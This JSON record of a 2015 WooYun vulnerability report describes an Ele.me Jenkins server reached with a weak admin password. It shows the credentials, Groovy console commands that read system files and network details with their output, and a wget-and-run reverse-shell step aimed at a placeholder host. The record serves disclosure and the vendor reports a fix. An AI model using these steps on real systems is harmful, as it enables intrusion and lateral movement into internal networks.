{"id": 22879, "wybug_id": "wooyun-2015-0115769", "wybug_title": "饿了么某系统未授权访问导致任意命令执行(已证明可接触内网)", "wybug_corp": "饿了么", "wybug_author": "我是小号", "wybug_date": "2015-05-24 08:15", "wybug_open_date": "2015-07-01 09:25", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-01：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 饿了么某系统未授权访问导致任意命令执行(已证明可接触内网) 详细说明：  Jenkins弱口令直接获取最高权限进入后台：\nhttp://203.156.233.234/loginadmin admin123\n证明一下这是ele.me的，在：http://203.156.233.234/script执行\nprintln \"cat /etc/hosts\".execute().text127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.101.25  yum.idc.ele.me192.168.101.25  puppetmaster.idc.ele.me192.168.101.26 sh-hadoop-webserver-101-27.idc.ele.me192.168.101.26 sh-hadoop-webserver-101-26.idc.ele.me\n很明显出现了ele.me的字样，而且idc代表什么你懂得\n\n漏洞危害可参考: WooYun: 网易某系统未授权访问可导致内网被渗透  WooYun: 人人网一处自动化测试平台可被渗透   漏洞证明：  1.任意文件读取etc/passwd\n\nprintln \"ifconfig\".execute().text\nem1       Link encap:Ethernet  HWaddr B8:2A:72:D7:C6:D6            inet addr:192.168.101.26  Bcast:192.168.101.255  Mask:255.255.255.0          inet6 addr: fe80::ba2a:72ff:fed7:c6d6/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:275315460 errors:0 dropped:0 overruns:0 frame:0          TX packets:144433154 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:96105166299 (89.5 GiB)  TX bytes:20698355410 (19.2 GiB)          Interrupt:35 lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:14918998 errors:0 dropped:0 overruns:0 frame:0          TX packets:14918998 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:221250320646 (206.0 GiB)  TX bytes:221250320646 (206.0 GiB)\n2.接触内网数据curl http://192.168.101.25\n\n\n\n3.执行下面的命令可反弹shell然后漫游内网（不做证明了）\nprintln \"wget http://xxx.xxx.com/back.py -P /tmp/\".execute().textprintln \"python /tmp/back.py 10.1.1.111 8080\".execute().text\n   修复方案：  1.更正弱口令2.有必要的话放入内网   版权声明：转载请注明来源 我是小号@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-05-25 11:35 厂商回复： 问题已经确认，已经整改中，感谢你对饿了么安全的关注。 最新状态： 2015-07-01：系统已废弃，感谢对饿了么的关注。  ", "replys": "漏洞评价：\n评论\n     2015-05-24 10:31 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  快点送外卖到东四宿舍    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}